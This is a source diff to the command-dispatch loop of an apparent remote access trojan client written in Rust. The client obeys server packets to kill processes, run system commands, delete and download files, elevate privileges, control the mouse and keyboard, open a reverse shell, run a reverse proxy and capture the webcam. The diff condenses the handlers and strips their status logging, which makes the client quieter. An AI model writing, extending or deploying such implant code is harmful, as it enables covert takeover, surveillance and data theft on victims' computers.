@@ -67,14 +67,9 @@ pub async fn reading_loop(
                 }
             }
 
-            Ok(Some(ClientboundPacket::KillProcess(process))) => {
-                kill_process(process.pid);
-            }
+            Ok(Some(ClientboundPacket::KillProcess(process))) => kill_process(process.pid),
 
-            Ok(Some(ClientboundPacket::Disconnect)) => {
-                println!("Server requested disconnection. Exiting program.");
-                std::process::exit(0);
-            }
+            Ok(Some(ClientboundPacket::Disconnect)) => std::process::exit(0),
 
             Ok(Some(ClientboundPacket::Reconnect)) => {
                 println!("Server requested reconnection. Reconnecting...");
@@ -82,89 +77,48 @@ pub async fn reading_loop(
                 break 'l;
             }
 
-            Ok(Some(ClientboundPacket::ManageSystem(command))) => {
-                system_commands(&command);
-            }
+            Ok(Some(ClientboundPacket::ManageSystem(command))) => system_commands(&command),
+
+            Ok(Some(ClientboundPacket::AvailableDisks)) => file_manager.list_available_disks().await,
+
+            Ok(Some(ClientboundPacket::PreviousDir)) => file_manager.navigate_to_parent().await,
+
+            Ok(Some(ClientboundPacket::ViewDir(path))) => file_manager.view_folder(&path).await,
+
+            Ok(Some(ClientboundPacket::RemoveDir(path))) => file_manager.remove_directory(&path).await,
+
+            Ok(Some(ClientboundPacket::RemoveFile(path))) => file_manager.remove_file(&path).await,
+
+            Ok(Some(ClientboundPacket::DownloadFile(path))) => file_manager.download_file(&path).await,
             
-            Ok(Some(ClientboundPacket::AvailableDisks)) => {
-                println!("Listing available disks");
-                file_manager.list_available_disks().await;
-            }
+            Ok(Some(ClientboundPacket::VisitWebsite(visit_data))) => visit_website(&visit_data),
 
-            Ok(Some(ClientboundPacket::PreviousDir)) => {
-                println!("Navigating to parent directory");
-                file_manager.navigate_to_parent().await;
-            }
+            Ok(Some(ClientboundPacket::ShowMessageBox(message_box_data))) => show_messagebox(message_box_data),
 
-            Ok(Some(ClientboundPacket::ViewDir(path))) => {
-                println!("Viewing directory: {}", path);
-                file_manager.view_folder(&path).await;
-            }
+            Ok(Some(ClientboundPacket::ElevateClient)) => elevate_client(),
 
-            Ok(Some(ClientboundPacket::RemoveDir(path))) => {   
-                file_manager.remove_directory(&path).await;
-            }
+            Ok(Some(ClientboundPacket::StartRemoteDesktop(config))) => start_remote_desktop(config),
 
-            Ok(Some(ClientboundPacket::RemoveFile(path))) => {
-                file_manager.remove_file(&path).await;
-            }
+            Ok(Some(ClientboundPacket::StopRemoteDesktop)) => stop_remote_desktop(),
 
-            Ok(Some(ClientboundPacket::DownloadFile(path))) => {
-                file_manager.download_file(&path).await;
-            }
-            
-            Ok(Some(ClientboundPacket::VisitWebsite(visit_data))) => {
-                visit_website(&visit_data);
-            }
+            Ok(Some(ClientboundPacket::MouseClick(click_data))) => mouse_click(click_data),
 
-            Ok(Some(ClientboundPacket::ShowMessageBox(message_box_data))) => {
-                show_messagebox(message_box_data);
-            }
+            Ok(Some(ClientboundPacket::KeyboardInput(input_data))) => keyboard_input(input_data),
 
-            Ok(Some(ClientboundPacket::ElevateClient)) => {
-                elevate_client();
-            }
+            Ok(Some(ClientboundPacket::StartShell)) => reverse_shell_lock.start_shell(),
 
-            Ok(Some(ClientboundPacket::StartRemoteDesktop(config))) => {
-                start_remote_desktop(config);
-            }
+            Ok(Some(ClientboundPacket::ExitShell)) => reverse_shell_lock.send_shell_command(b"exit"),
 
-            Ok(Some(ClientboundPacket::StopRemoteDesktop)) => {
-                stop_remote_desktop();
-            }
-
-            Ok(Some(ClientboundPacket::MouseClick(click_data))) => {
-                mouse_click(click_data);
-            }
-
-            Ok(Some(ClientboundPacket::KeyboardInput(input_data))) => {
-                keyboard_input(input_data);
-            }
-
-            Ok(Some(ClientboundPacket::StartShell)) => {
-                reverse_shell_lock.start_shell();
-            }
-
-            Ok(Some(ClientboundPacket::ExitShell)) => {
-                reverse_shell_lock.exit_shell();
-            }
-
-            Ok(Some(ClientboundPacket::ShellCommand(data))) => {
-                reverse_shell_lock.execute_shell_command(&data);
-            }
+            Ok(Some(ClientboundPacket::ShellCommand(data))) => reverse_shell_lock.send_shell_command(format!("{}\n", data).as_bytes()),
 
             Ok(Some(ClientboundPacket::StartReverseProxy(port))) => {
                 reverse_proxy.setup(config.ip.clone(), port);
                 reverse_proxy.start().await;
             }
 
-            Ok(Some(ClientboundPacket::StopReverseProxy)) => {
-                reverse_proxy.stop().await;
-            }
+            Ok(Some(ClientboundPacket::StopReverseProxy)) => reverse_proxy.stop().await,
 
-            Ok(Some(ClientboundPacket::RequestWebcam)) => {
-                take_webcam().await;
-            }
+            Ok(Some(ClientboundPacket::RequestWebcam)) => take_webcam().await,
 
             Ok(Some(p)) => {
                 println!("!!Unhandled packet: {:?}", p);
@@ -172,7 +126,7 @@ pub async fn reading_loop(
             
             Err(e) => {
                 println!("Connection error: {}", e);
-                reverse_shell_lock.exit_shell();
+                reverse_shell_lock.send_shell_command(b"exit");
                 reverse_proxy.stop().await;
                 close_sender.send(()).unwrap_or_else(|_| println!("Failed to send close signal"));
                 break 'l;
@@ -180,7 +134,7 @@ pub async fn reading_loop(
             
             _ => {
                 println!("Connection closed");
-                reverse_shell_lock.exit_shell();
+                reverse_shell_lock.send_shell_command(b"exit");
                 reverse_proxy.stop().await;
                 close_sender.send(()).unwrap_or_else(|_| println!("Failed to send close signal"));
                 break 'l;
